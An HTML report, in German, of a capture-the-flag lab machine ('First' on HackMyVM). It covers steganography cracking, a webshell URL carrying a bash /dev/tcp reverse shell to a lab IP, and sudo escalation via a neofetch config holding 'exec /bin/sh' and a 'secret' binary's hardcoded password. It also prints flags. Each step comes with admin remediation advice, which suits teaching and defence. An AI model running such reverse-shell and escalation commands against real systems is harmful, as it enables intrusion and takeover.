@@ -1,0 +1,385 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>First - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+
+    <!-- HINWEIS: Die Hintergrundfarbe für den Header wird durch CSS gesteuert (.header-bg) -->
+    <div class="header-bg">
+        <h1>First - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- HINWEIS: Die Farbe für 'Easy' (Lime/Grün) wird durch CSS gesteuert (h2 in .level-container) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                 <!-- HINWEIS: Die Hintergrundfarbe der Segmente (Lime/Grün) wird durch CSS gesteuert (.segment-*) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- HINWEIS: Die Hintergrundfarbe des inneren Kreises wird durch CSS gesteuert (.inner, passend zum Header) -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">pty</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">mktemp</div>
+                <div class="tool-item">neofetch</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">vi (implied)</div>
+                <div class="tool-item">secret (custom binary)</div>
+                <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-first">Privilege Escalation (User first)</a></li>
+                <li><a href="#poc-first">Proof of Concept (Privilege Escalation zu first)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (User root)</a></li>
+                <li><a href="#poc-root">Proof of Concept (Privilege Escalation zu root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die Untersuchung beginnt mit Steganographie-Analyse einer Bilddatei (`first_Logo.jpg`), die vermutlich von der Webseite stammt. `stegseek` wird verwendet, um versteckte Daten mit Passwörtern aus der `rockyou.txt`-Liste zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `stegseek` ist erfolgreich und extrahiert Daten in die Datei `first_Logo.jpg.out`. Das verwendete Passwort ist `<span class="password">firstgurl1</span>`. Der Inhalt der `.out`-Datei ist eine Base64-kodierte Nachricht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dekodieren Sie die Base64-Nachricht, um den versteckten Inhalt zu enthüllen. Merken Sie sich das Passwort `firstgurl1` für mögliche spätere Verwendung.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie das Verstecken von sensiblen Informationen oder Hinweisen in Bildern mittels Steganographie auf öffentlich zugänglichen Webservern. Verwenden Sie keine leicht zu erratenden Passwörter für Steganographie.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~/first.hmv/first]
+└─# <span class="command">stegseek first_Logo.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                     <!-- Implizite Erfolgsmeldung -->
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~/first.hmv/first]
+└─# <span class="command">cat first_Logo.jpg.out</span></div>
+                     <pre>SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</pre>
+                    <p class="comment">Gefundenes Passwort (von stegseek): <span class="password">firstgurl1</span></p>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Base64-kodierte Nachricht aus der Bilddatei wird dekodiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die dekodierte Nachricht enthält einen Hinweis auf einen versteckten Pfad, der als Hex-String kodiert ist: `2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74`. Sie warnt auch vor Directory Busting und fordert auf, schnell zu handeln ("do the first first").</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konvertieren Sie den Hex-String in ASCII, um den versteckten Pfad zu erhalten. Untersuchen Sie diesen Pfad auf dem Webserver.
+             <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie Obfuskation (wie Hex-Kodierung) als Sicherheitsmaßnahme. Sichern Sie Pfade angemessen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿Darkspirit)-[~/first.hmv/first]
+└─# <span class="command">echo -n "SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==" | base64 -d</span></div>
+                       <pre>
+Hi I had to change the name of the todo list becouse directory busting is
+too easy theese days also I encoded this in besa64 becouse it is cool btw
+your todo list is :
+
+ 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74
+
+do it quick we are vulnarable do the first first </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Hex-String aus der dekodierten Nachricht wird mithilfe eines Online-Tools (oder manuell) in ASCII konvertiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Konvertierung ergibt den Pfad `/t0d0_l1st_f0r_f1r5t`. Dies ist das versteckte Verzeichnis, das untersucht werden muss.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie eine Verzeichnis-Enumeration (z.B. mit Gobuster) auf `http://first.hmv/t0d0_l1st_f0r_f1r5t/` durch. `first.hmv` muss ggf. zur `/etc/hosts` Datei hinzugefügt werden, die auf die Ziel-IP zeigt.
+             <br><strong>Empfehlung (Admin):</strong> Sichern Sie das Verzeichnis `/t0d0_l1st_f0r_f1r5t/` angemessen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <!-- Kein Prompt, Referenz und Ergebnis der Konvertierung -->
+                       <pre>
+https://www.rapidtables.com/convert/number/hex-to-ascii.html
+2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74
+--------------------------------------------------------------
+/t0d0_l1st_f0r_f1r5t
+--------------------------------------------------------------
+
+http://first.hmv/t0d0_l1st_f0r_f1r5t/</pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um das zuvor entdeckte Verzeichnis `http://first.hmv/t0d0_l1st_f0r_f1r5t/` auf weitere Dateien und Unterverzeichnisse zu scannen. Der `--wildcard`-Parameter wird verwendet, was darauf hindeutet, dass der Server möglicherweise für nicht existierende Pfade einen Standardinhalt zurückgibt (was normale Scans stören kann).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die genaue Ausgabe von Gobuster fehlt im Log. Die nachfolgenden Schritte implizieren jedoch, dass ein Verzeichnis `/uploads/` und darin eine Webshell (`ben.phtml`) gefunden oder eine Upload-Funktion entdeckt und ausgenutzt wurde, um `ben.phtml` hochzuladen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/uploads/`-Verzeichnis und die `ben.phtml`-Datei. Nutzen Sie die Webshell zur Codeausführung.
+            <br><strong>Empfehlung (Admin):</strong> Sichern Sie Upload-Funktionen rigoros (Dateityp-Validierung, Größenbeschränkung, Speichern außerhalb des Web-Roots, Umbenennen hochgeladener Dateien). Beschränken Sie den Zugriff auf Upload-Verzeichnisse und verhindern Sie die Ausführung von Skripten darin.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~/first.hmv/first]
+└─# <span class="command">gobuster dir -u http://first.hmv/t0d0_l1st_f0r_f1r5t/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                    <!-- Keine Ausgabe im Originaltext -->
+                    <pre>[...]</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine URL zur Webshell `ben.phtml` im Verzeichnis `/uploads/` gezeigt. Diese Shell nimmt einen `cmd`-Parameter entgegen, um Befehle auszuführen. Zuerst wird `ls` ausgeführt (implizit), dann wird versucht, eine Reverse Shell zu starten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Existenz einer funktionierenden Webshell (`ben.phtml`) ermöglicht Remote Code Execution (RCE). Die Verwendung des `cmd`-Parameters ist typisch für einfache Webshells.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf dem Angreifer-System (IP `192.168.2.140` laut URL, Port `9001`) und rufen Sie dann die Reverse-Shell-URL auf, um eine interaktive Shell zu erhalten.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die Webshell `ben.phtml` und das Verzeichnis `/uploads/` oder sichern Sie es. Untersuchen Sie, wie die Shell hochgeladen werden konnte.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, URLs der Webshell -->
+                     <pre>
+http://first.hmv/t0d0_l1st_f0r_f1r5t/uploads/ben.phtml?cmd=ls
+http://first.hmv/t0d0_l1st_f0r_f1r5t/uploads/ben.phtml?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.140%2F9001%200%3E%261%27</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird gestartet (`nc -lvnp 9001`). Nach Aufruf der Reverse-Shell-URL (implizit) wird eine Verbindung vom Zielsystem (`192.168.2.107`) empfangen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Reverse Shell ist erfolgreich. Der Angreifer hat nun eine Shell als Benutzer `www-data` im Verzeichnis `/var/www/html/t0d0_l1st_f0r_f1r5t/uploads`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell mit Python pty und `export TERM`.
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die RCE-Schwachstelle (Webshell).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~/first.hmv/first]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.131] from (UNKNOWN) [192.168.2.107] 41984</pre> <!-- Listener IP passt nicht zur Reverse Shell URL (131 vs 140) -->
+                    <!-- Prompt der erhaltenen Shell -->
+                    <div class="prompt">www-data@first:/var/www/html/t0d0_l1st_f0r_f1r5t/uploads$</div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene Shell wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Shell ist nun interaktiv.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie die Enumeration als `www-data`.
+             <br><strong>Empfehlung (Admin):</strong> Administrative Aktion des Angreifers.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Shell vom Zielsystem -->
+                      <pre>python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
+                      <pre>export TERM=xterm</pre>
+                      <div class="prompt">www-data@first:/var/www/html/t0d0_l1st_f0r_f1r5t/uploads$</div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privilege-escalation-first">
+            <h2>Privilege Escalation (User first)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Das `/home`-Verzeichnis wird aufgelistet, es existiert ein Benutzer `first`. Es wird `sudo -l` ausgeführt (implizit, da der nächste Schritt eine sudo-Ausnutzung ist).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `first` wird bestätigt. Die `sudo -l`-Ausgabe (nicht gezeigt) muss ergeben haben, dass `www-data` den Befehl `neofetch` als Benutzer `first` ausführen darf. Dies ist eine ungewöhnliche, aber ausnutzbare `sudo`-Regel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo neofetch`-Berechtigung zur Eskalation zu `first`. Suchen Sie auf GTFOBins nach der Technik.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die `sudo`-Regeln für `www-data`. Geben Sie Webserver-Benutzern keine `sudo`-Rechte, schon gar nicht für potenziell unsichere Befehle wie `neofetch` mit Konfigurationsdateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@first:/var/www/html/t0d0_l1st_f0r_f1r5t/uploads$ <span class="command">ls -la /home</span></div>
+                     <pre>drwxr-xr-x  5 first first 4096 Aug 10 06:30 first</pre>
+                     <!-- Impliziter Befehl -->
+                     <p class="comment"># sudo -l (Ausgabe nicht im Log, aber impliziert Berechtigung für nächsten Schritt)</p>
+                 </div>
+             </div>
+
+             <!-- POC Abschnitt 1 beginnt hier -->
+             <section id="poc-first">
+                 <h2>Proof of Concept (Privilege Escalation zu first via 'sudo neofetch')</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `www-data` hat die `sudo`-Berechtigung, `/bin/neofetch` als Benutzer `first` auszuführen. `neofetch` erlaubt das Laden einer Konfigurationsdatei über den Parameter `--config`. Wenn diese Konfigurationsdatei ausführbare Befehle enthält und mit den Rechten des Zielbenutzers (`first`) interpretiert wird, kann dies zur Codeausführung als dieser Benutzer missbraucht werden.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Shell-Zugriff als `www-data`.</li>
+                         <li>`sudo`-Berechtigung für `www-data`, um `neofetch` als `first` auszuführen.</li>
+                         <li>Möglichkeit, eine temporäre Datei zu erstellen und deren Pfad an `neofetch` zu übergeben.</li>
+                     </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Erstellen der bösartigen Konfigurationsdatei:</strong> Eine temporäre Datei wird mit `mktemp` erstellt. In diese Datei wird der Befehl `exec /bin/sh` geschrieben. Dieser Befehl ersetzt den laufenden Prozess durch eine Shell.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Die temporäre Datei (`/tmp/tmp.CvOjpkcwzr`) mit dem Shell-Payload wird erfolgreich erstellt.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `neofetch` mit `sudo -u first` und der Option `--config` auf, um die erstellte Datei zu laden.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">www-data@first:/tmp$ <span class="command">TF=$(mktemp)</span></div>
+                           <div class="prompt">www-data@first:/tmp$ <span class="command">echo 'exec /bin/sh' >$TF</span></div>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>2. Ausführen von 'neofetch' mit bösartiger Konfiguration:</strong> Der Befehl `sudo -u first neofetch --config $TF` wird ausgeführt. Ein erster Versuch scheitert mit "Permission denied" beim Zugriff auf die temporäre Datei.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Der Fehler "Permission denied" tritt auf, weil die von `www-data` erstellte temporäre Datei standardmäßig nur für `www-data` les-/schreibbar ist. Der Benutzer `first` (als der `neofetch` läuft) kann sie nicht lesen.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ändern Sie die Berechtigungen der temporären Datei, damit sie für `first` (oder alle) lesbar/ausführbar ist (`chmod 777`). Versuchen Sie den `sudo neofetch`-Befehl erneut.
+                 <br><strong>Empfehlung (Admin):</strong> Beheben Sie die `sudo`-Regel.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">www-data@first:/tmp$ <span class="command">sudo -u first neofetch --config $TF</span></div>
+                           <pre>
+/bin/neofetch: line 4459: /tmp/tmp.CvOjpkcwzr: Permission denied
+            .-/+oossssoo+/-.               first@first
+        `:+ssssssssssssssssss+:`           -----------
+      -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.4 LTS x86_64
+    .ossssssssssssssssssdMMMNysssso.       Host: VirtualBox 1.2
+   /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 5.4.0-122-generic
+  +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 22 mins
+ /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 698 (dpkg), 4 (snap)
+.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: bash 5.0.17
++sssshhhyNMMNyssssssssssssyNMMMysssssss+   Resolution: preferred
+ossyNMMMNyMMhsssssssssssssshmmmhssssssso   CPU: AMD Ryzen 9 5900X (1) @ 3.700GHz
+ossyNMMMNyMMhsssssssssssssshmmmhssssssso   GPU: 00:02.0 VMware SVGA II Adapter
++sssshhhyNMMNyssssssssssssyNMMMysssssss+   Memory: 235MiB / 976MiB
+.ssssssssdMMMNhsssssssssshNMMMdssssssss.
+ /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/
+  +sssssssssdmydMMMMMMMMddddyssssssss+
+   /ssssssssssshdmNNNNmyNMMMMhssssss/
+    .ossssssssssssssssssdMMMNysssso.
+      -+sssssssssssssssssyyyssss+-
+        `:+ssssssssssssssssss+:`
+            .-/+oossssoo+/-.</pre>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>3. Korrigieren der Berechtigungen und erneutes Ausführen:</strong> Die Berechtigungen der temporären Datei werden mit `chmod 777` geändert. Der `sudo neofetch`-Befehl wird erneut ausgeführt.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Diesmal ist der Befehl erfolgreich! `neofetch` lädt die Konfigurationsdatei, führt `exec /bin/sh` aus und startet eine Shell. Der `id`-Befehl bestätigt, dass wir nun als `first` (UID 1000) agieren.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell als `first`. Suchen Sie nach Wegen zur Eskalation zu root.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `sudo`-Regel.</p>
+                 <div class="code-block">
+                      <div class="terminal">
+                            <div class="prompt">www-data@first:/tmp$ <span class="command">ls</span></div>
+                            <pre>tmp.CvOjpkcwzr	tmp.Nb2zfzfVjs</pre> <!-- Zeigt die temp. Datei -->
+                            <div class="prompt">www-data@first:/tmp$ <span class="command">chmod 777 /tmp/tmp.CvOjpkcwzr</span></div>
+                            <div class="prompt">www-data@first:/tmp$ <span class="command">sudo -u first /bin/neofetch --config $TF</span></div>
+                            <!-- Shell wird gestartet -->
+                            <div class="prompt">$ <span class="command">id</span></div>
+                            <pre>uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</pre>
+                            <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                            <div class="prompt">first@first:/tmp$ <span class="command">export TERM=xterm</span></div>
+                            <div class="prompt">first@first:/tmp$ </div>
+                      </div>
+                  </div>
+                 <p class="evaluation"><strong>Risikobewertung:</strong> Mittel. Ermöglicht die Übernahme eines anderen Benutzerkontos durch eine unsichere `sudo`-Regel.</p>
+                 <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie die `sudo`-Regel, die `www-data` erlaubt, `neofetch` als `first` auszuführen.</li>
+                        <li>Generell sollten Webserver-Benutzer keine `sudo`-Rechte haben.</li>
+                    </ol>
+                 </p>
+             </section> <!-- POC Abschnitt 1 endet hier -->
+        </section>
+
+        <section id="privilege-escalation-root">
+             <h2>Privilege Escalation (User root)</h2>
+             <!-- POC Abschnitt 2 beginnt hier -->
+             <section id="poc-root">
+                 <h2>Proof of Concept (Privilege Escalation zu root via 'sudo secret')</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `first` hat die `sudo`-Berechtigung, ein benutzerdefiniertes Programm `/usr/bin/secret` (oder einfach `secret`, wenn es im PATH liegt) auszuführen. Dieses Programm fordert ein Passwort an und führt bei korrekter Eingabe einen übergebenen Befehl aus. Das Passwort ist hartkodiert oder leicht zu erraten.</p>
+                  <p class="analysis"><strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Shell-Zugriff als Benutzer `first`.</li>
+                         <li>`sudo`-Berechtigung für `first`, um `/usr/bin/secret` auszuführen (impliziert).</li>
+                         <li>Kenntnis des Passworts für das `secret`-Programm.</li>
+                     </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Ausführen von 'sudo secret' und Passworteingabe:</strong> Der Befehl `sudo secret` wird ausgeführt. Das Programm fragt nach einem Passwort. Das Passwort `<span class="password">12345678910</span>` wird eingegeben.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Das Passwort wird als korrekt erkannt. Das Programm fordert nun zur Eingabe eines Befehls auf.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Geben Sie `bash` oder `/bin/bash` ein, um eine Root-Shell zu erhalten.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie das unsichere `secret`-Programm oder die `sudo`-Regel. Verwenden Sie keine Programme mit hartkodierten Passwörtern für Privilegienverwaltung.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">first@first:/tmp$ <span class="command">sudo secret</span></div>
+                           <pre>pass: <span class="password">12345678910</span>
+correct, input command:</pre>
+                      </div>
+                  </div>
+
+                 <p class="analysis"><strong>2. Starten der Root-Shell:</strong> Der Befehl `bash` wird eingegeben.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Das `secret`-Programm führt `bash` mit den durch `sudo` erhaltenen Root-Rechten aus. Der Angreifer erhält eine Root-Shell (`root@first:/tmp#`).</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Lesen Sie die Root-Flag.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie das `secret`-Programm und die zugehörige `sudo`-Regel.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                            <!-- Fortsetzung der Interaktion mit 'secret' -->
+                           <pre>correct, input command:<span class="command">bash</span></pre>
+                           <div class="prompt">root@first:/tmp# </div>
+                      </div>
+                  </div>
+                 <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Ein benutzerdefiniertes Programm, das über `sudo` ausgeführt werden kann und ein schwaches/hartkodiertes Passwort zur Befehlsausführung verwendet, stellt eine direkte und einfache Methode zur vollständigen Systemübernahme dar.</p>
+                 <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie das Programm `/usr/bin/secret`.</li>
+                        <li>Entfernen Sie die entsprechende `sudo`-Regel für den Benutzer `first`.</li>
+                        <li>Verwenden Sie Standardmechanismen zur Rechteverwaltung und vermeiden Sie unsichere Eigenentwicklungen.</li>
+                    </ol>
+                 </p>
+             </section> <!-- POC Abschnitt 2 endet hier -->
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird in `/root` gewechselt und `r00t.txt` gelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Root-Flag erfolgreich gelesen: `<span class="password">477d9a6aa33e3818ced1ad3015b53b43</span>`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dokumentieren.
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Schwachstellen.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">root@first:/tmp# <span class="command">cd /root</span></div>
+                       <div class="prompt">root@first:~# <span class="command">ls</span></div>
+                       <pre>r00t.txt  snap</pre>
+                       <div class="prompt">root@first:~# <span class="command">cat r00t.txt</span></div>
+                       <pre><span class="password">477d9a6aa33e3818ced1ad3015b53b43</span></pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Als Root wird die User-Flag in `/home/first/user.txt` gelesen (obwohl sie bereits als `www-data` gelesen wurde).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag bestätigt: `<span class="password">3120a57478d631a5ef82ef5d96146389</span>`.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">root@first:~# <span class="command">cd /home</span></div>
+                       <div class="prompt">root@first:/home# <span class="command">ls</span></div>
+                       <pre>first</pre>
+                       <div class="prompt">root@first:/home# <span class="command">cd first</span></div>
+                       <div class="prompt">root@first:/home/first# <span class="command">ls</span></div>
+                       <pre>snap  user.txt</pre>
+                       <div class="prompt">root@first:/home/first# <span class="command">cat user.txt</span></div>
+                       <pre><span class="password">3120a57478d631a5ef82ef5d96146389</span></pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/first/user.txt</div>
+                     <div class="flag-value"><span class="password">3120a57478d631a5ef82ef5d96146389</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/r00t.txt</div>
+                     <div class="flag-value"><span class="password">477d9a6aa33e3818ced1ad3015b53b43</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-07-10</p> <!-- Kein Datum aus Scans verfügbar -->
+    </footer>
+</body>
+</html>
